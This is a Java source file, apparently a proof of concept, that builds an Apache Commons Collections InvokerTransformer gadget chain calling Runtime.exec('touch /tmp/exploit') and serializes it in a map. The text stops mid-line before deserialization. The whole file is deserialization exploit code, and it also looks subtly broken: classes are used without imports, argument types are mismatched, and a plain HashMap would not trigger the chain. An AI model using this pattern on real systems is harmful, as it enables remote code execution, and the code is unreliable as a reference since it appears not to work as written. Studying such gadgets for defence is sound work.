import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class TestInvokerTransformer {

    public static void main(String[] args) throws Exception {
        Transformer transformerChain = new ChainedTransformer(
                new Object[]
                        {new ConstantTransformer(Runtime.class),
                                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"touch /tmp/exploit"})});

        Map map = new HashMap();
        map.put("value", "dummy");

        Map<String, Object> innerMap = new HashMap<>();
        innerMap.put("key", transformerChain);

        map.put("__redirector", innerMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray